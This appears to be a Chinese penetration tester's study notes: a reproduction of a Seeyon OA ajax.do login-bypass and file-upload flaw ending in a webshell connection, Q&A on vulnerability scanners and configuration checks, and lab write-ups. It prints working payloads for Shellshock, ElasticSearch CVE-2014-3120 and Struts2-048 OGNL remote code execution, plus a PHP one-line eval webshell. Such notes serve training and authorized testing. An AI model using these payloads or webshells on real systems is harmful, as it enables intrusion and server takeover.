# 致远OA-ajax.do任意文件上传漏洞

<br/>

渗透测试网站前必须签订渗透测试授权书，若私自渗透网站，后果自负

具体处罚见《中华人民共和国网络安全法》

本文经对某公司签过渗透测试授权书下进行。

<br/>

**致远OA-ajax.do任意文件上传漏洞复现:**


**漏洞详情：**

<br/>
致远OA ajax.do登录绕过 任意文件上传

<br/>

漏洞影响范围:

致远OA V8.0;

致远OA V7.1、V7.1SP1;

致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3;

致远OA V6.0、V6.1SP1、V6.1SP2;

致远OA V5.x;

致远OA G6

<br/>

**漏洞复现：**


1.致远OA V8 前台

<img src="https://raw.githubusercontent.com/rmrfstop/rmrfstop.github.io/ZY_OA/1.png">

<br/>

2.可能存在漏洞路径：

```
http://ip:port/seeyon/thirdpartyController.do.css/..;/ajax.do
```

<img src="https://raw.githubusercontent.com/rmrfstop/rmrfstop.github.io/ZY_OA/2.png">
<br/>

3.使用poc脚本进行测试，验证漏洞是否存在：

poc脚本如下：

<img src="https://raw.githubusercontent.com/rmrfstop/rmrfstop.github.io/ZY_OA/3.png">
<br/>

4.返回响应200，成功

<img src="https://raw.githubusercontent.com/rmrfstop/rmrfstop.github.io/ZY_OA/4.png">
<br/>

5.出现以下异常，则可能存在漏洞。

<img src="https://raw.githubusercontent.com/rmrfstop/rmrfstop.github.io/ZY_OA/5.png">
<br/>

6.冰蝎连接shell

```
路径： http://ip:port/seeyon/SeeyonUpdate1.jspx
```

```
密码： rebeyond
```

成功拿到管理员权限：

<img src="https://raw.githubusercontent.com/rmrfstop/rmrfstop.github.io/ZY_OA/6.png">

<br/>

7.修复建议：

目前，致远OA官方已发布补丁完成漏洞修复，CNVD平台建议用户立即通过官方网站安装最新补丁建议使用致远OA系统构建网站的信息系统运营者进行自查，发现存在漏洞后，及时升级或联系致远公司。
补丁链接：

```
http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=1
```


<br><br><br><br><br><br>




# 安全服务问题

#### 扫描器工作原理
扫描器的工作原理是基于CVE漏洞库的半连接的扫描方式，首先探测目标系统的活动主机，对活动主机进行端口扫描，确定系统开放的端口，同时根据协议指纹技术识别出主机的操作系统类型。然后扫描器对开放的端口进行网络服务类型的识别，确定其提供的网络服务。漏洞扫描器根据目标系统的的操作系统平台和提供的网络服务，调用漏洞资料库中已知的各种漏洞进行逐一检测，通过对探测响应数据包的分析判断是否存在已知安全漏洞。目标可以是工作站、服务器、交换机、数据库应用等各种对象。扫描结果可以给用户提供周密可靠的安全性分析报告，是提高网络安全整体水平的重要依据。

#### 服务器ip禁ping怎么办
遇到服务器禁ping的情况，应先问知kh的服务器是否为开启的状态，若开启了禁ping策略，扫描器需配置高级选项中，勾掉“禁止存活性测试”，但会降低扫描的速率。

#### 配置核查，都包括哪些东西
配置核查包括对操作系统，数据库，中间件，网络设备，安全设备，其他等进行配置核查，配置核查属于机器安全配置的基线，例如：linux配置核查中包括身份鉴别、访问控制、入侵防范、安全审计等

#### 配置核查的方式
配置核查方式，有在线和离线，1：其中离线检查需下载对应的离线检查工具，按照其操作方法进行脚本执行，将执行结果导入扫描器即可生成报告。2：在线方式，直接勾选配置检查模块进行在线模式检查，需注意常见的windows的在线检查须通过rdp协议进行登录账号扫描，需在windows服务器上装插件，也可以通过smb协议进行登录扫描，但要提前确认smb账号密码。Linux、路由器、交换机、华为防火墙、配置核查直接使用root等管理员账户账号密码检查即可

#### 漏洞和配置核查的安全加固怎么做
漏洞加固最好的处理方式进行修补补丁、系统升级、临时修复通过更改配置、更改路径、删除文件等方式处理。配置核查加固一般根据扫描报告中配置检查项标准值进行配置更改，对于未检查出实际值的配置项需与客户确认问题是否存在或自行核查以确认问题

#### 扫描只提供了一个IP地址，可以怎么配置扫描器网络
1.配置扫描器主机地址，本机地址和主机地址同段，将客户提供ip地址配置为业务口进行扫描工作；属于桥接模式
2.在nat模式下，可以在扫描器后台配置dhcp，自动获取扫描ip，然后通过该ip登录后台，在网络配置中添加客户提供ip进行扫描
注：扫描前要ping一下网关确保网络正常

<br/> <br/> <br/> <br> <br>

# 靶场漏洞

#### bash 命令执行 （CVE-2014-6271）
目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。 影响版本：GNU Bash <= 4.3
利用过程
有两个页面http://ip:port/victim.cgi和http://ip:port/safe.cgi
访问 http://ip:port/victim.cgi，通过Burp截包修改 HTTP 请求头中User-Agent字段：
User-Agent: () { :;};echo `/bin/ls ls /tmp`" #列出tmp目录下所有文件
/bin/ls 事调用bin目录下ls事件  获取flag

ElasticSearch（CVE-2014-3120）命令执行漏洞复现
访问靶场环境，启动后可在浏览器页面成功访问
漏洞复现
用burp抓数据包
利用该漏洞之前，es至少需要存在一条数据，通过以下请求包创建数据：

1、利用POST方式提交数据
2、文件名字任意
3、浏览器的原生 form 表单，如果不设置 enctype 属性，那么其中Content-Type字段最终会以 application/x-www-form-urlencoded 方式提交数据。
而对于"application/x-www-form-urlencoded"，其参数组织形式是"键值对"。

三、利用命令执行漏洞，将一段java代码放进去
java代码：{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {}
        }      }    },
    "script_fields": {
        "command": {
            "script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"ls /tmp\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }    }    }
        
其中：exec(\"ls /tmp\") 中是执行命令内容
struts2-048 远程代码执行
访问漏洞存在的路径 /integration/saveGangster.action
构建命令执行的pyload,执行命令为id
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ls /tmp').getInputStream())).(#q)}    

其中：exec('ls /tmp') 中是执行命令内容,可查看tmp下存在的flag

<br/> <br/> <br/>

## 线上靶场

通关线上靶场大多数S2和weblogic发序列化漏洞，可通过java反序列化漏洞利用工具进行测试，
瓶颈：之前不了解原因是因为，对文件存在的目录不了解，使用 pwd 命令 进行查看路径，发现都不是在根目录，通常靶场flag存在根目录下，tmp文件夹中，通关cd / 命令可以到达根目录下，之前使用命令执行时，用的都是相对路径，没有使用绝对路径进行执行，所以导致命令执行失败
问题：命令执行是把 "cd / | ls" 和 "ls | cd /"先后执行顺序弄反，导致错误的命令执行

<br/> <br/> <br/>

## 一句话木马原理

一句话木马 webshell 到web服务器目录 接着权获取系统权限

基本原理利用文件上传漏洞上传webshell

 <?php @eval($_POST['pass']);?> 

--- <?php ?> --- php文件要求格式

--- @ 表示后面即使执行错误，也不报错

--- eval() 函数表示把括号内的全当代码执行

--- $_POST['pass`']`表示从页面中获得pass这个参数值。

​	php 超全局变量：`$_GET`、`$_POST`就是其中之一

​    `		$_POST['pass']`; 的意思就是pass这个变量，用post的方法接收。

​					就是来收集 请求方法为post 的名字为pass表单里面的值

​			 ---  $_POST数组获取使用POST方式提交的表单数据

​                form标签的指定该属性："method="post"。

​					就是获取表单名为pass中的表单内容

  	 比如 eval( "echo 'a' ") == echo 'a' 

​		 <?php @eval($_POST['pass']);?>   

​			首先用post请求接受变量pass  若pass = echo 'a'  

​			代码就变成了 <?php eval("echo 'a';"); ?>

所以我们可以简单的想 中国菜刀发的这么一个包 包的代码是打开指定目录的句柄，然后进行循环扫描，并附带上权限、时间、大小、日期 这个包我这里用package来代替 所以在操作的时候其实就是 key = package 然后通过eval函数执行package的php代码 从而最终达成目的
中国菜刀 发一个包，包的代码是打开目录的
